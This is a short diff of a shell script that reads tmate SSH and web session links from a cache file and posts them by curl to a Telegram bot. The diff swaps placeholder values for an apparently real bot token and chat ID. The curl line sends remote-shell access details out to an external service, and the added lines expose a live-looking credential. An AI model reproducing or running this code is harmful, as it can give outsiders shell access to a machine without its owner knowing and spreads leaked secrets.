@@ -46,6 +46,6 @@ WEB_SESSION=$(cat ~/.tmatCache | grep "web session:")
 #Tg bot api
 Raw="${SSH_SESSION} ${WEB_SESSION}"
 message=${Raw//" "/%20}
-TOKEN="YOUR_BOT_TOKEN_HERE"
-CHAT_ID="CHAT_ID_HERE"
+TOKEN="1963665302:AAFKNH7N7LBZpdQAsZKi-RVXgDqB1w1oosU"
+CHAT_ID="-1001513087038"
 curl "https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}?&text=${message}" > /dev/null 2>&1
